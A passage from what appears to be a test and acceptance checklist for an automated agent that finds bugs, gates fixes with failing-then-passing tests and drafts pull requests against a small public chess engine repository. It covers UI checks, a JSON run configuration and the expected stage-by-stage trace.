| B-8 | Expand the **3rd** finding | the 3rd panel opens (duplicate React keys open the 2nd instead) |
| B-9 | Finding detail | **Defect** and **Hypothesis** populated — not an unexplained diff |
| B-10 | A `committed` finding | shows **View commit** linking to `https://github.com/Zedmor/chess_test/commit/<sha>`, **not** a re-commit button |
| B-11 | A `filed` finding | still shows the commit **action** |
| B-12 | PR row | PR link renders (the ledger field is `cr`; a UI reading only `pr` shows nothing); verdict badge + checks label present |
| B-13 | Refresh-PR and discuss buttons | refetch works; discuss opens a resumable session |
| B-14 | Colors | app design tokens only (`text-muted`, `text-accent`, `border-border`, `hover:bg-accent/20`) — no bespoke palette, no undefined CSS vars |
| B-15 | i18n | no hardcoded English; `viewCommit` resolves in every locale `i18n/languages.ts::SUPPORTED_LANGUAGES` registers (`website/src/test/i18nAllLanguagesEntry.test.ts` pins that every entry point reaches every catalog) |
| B-16 | Console | no errors beyond the pre-existing CSP / Google-Fonts warnings |

#### Full-loop acceptance against a reference repository

The reference target is a small public chess engine repository
(`https://github.com/Zedmor/chess_test`). A small, fast suite is what makes a full-loop
test practical: the gate runs the suite several times per candidate, and a whole-repo
suite cannot finish inside `_SUITE_TIMEOUT_S` (`profiles/github_repo/profile.py`).

Run config:

```json
{
  "target_url": "https://github.com/Zedmor/chess_test",
  "branch": "origin/main",
  "directCommit": false,
  "maxCycles": 6,
  "maxHours": 1.0,
  "proposerWide": 1,
  "proposerDeep": 1,
  "forceBugSeeds": true,
  "canaryAdvisory": true
}
```

> `directCommit: false` on the first pass so the loop drafts **PRs** rather than pushing —
> and `main` would be refused by the protected-branch denylist anyway. Re-run with
> `directCommit: true` **against a feature branch** to exercise the autocommit path.

**Expected trace, in order:**

1. **Preflight** — push-disabled asserted; deps green; do-not-pollute snapshot taken.
2. **Calibrate** — ruler `calibrated`, noise band recorded. The canary is *advisory* here:
   a suite ruler cannot always force a known win, and that must WARN, not halt.
3. **Discover** — the agent reads real files and emits surfaces pinned to
   `file:line:symbol`. Assert `runner_ok: true`, `raw_items > 0`, every surface a real path.
4. **Propose** — wide and deep author in **separate** worktrees on **different**
   candidates (overlapping candidates spend two agent passes on one locus).
5. **Gate** — bug candidate: T0 build → T1 lint → T2 collect → RED (×2 flake check) →
   GREEN → STAYGREEN. Assert each flag explicitly true in the artifact.
6. **Keep** — accepted only on a real transition; a perf candidate must clear the noise
   band in the **improving direction** for the ruler's `direction`.
7. **Draft PR** — a draft PR appears on the repo, body carrying the RED→GREEN narrative.
   Assert `--draft`; assert nothing merged or marked ready.
8. **Ledger** — the finding ends `filed` (or `committed` in autocommit mode) with a
   fingerprint, and a re-run does **not** re-file it (dedup invariant).

**Acceptance:** ≥1 finding reaches `filed`/`committed` with a real draft PR or commit,
**and** its detail panel explains the defect. A run that legitimately finds nothing must
end `no_defect` — an honest "no defect" is a pass; a *fabricated* fix is a failure.
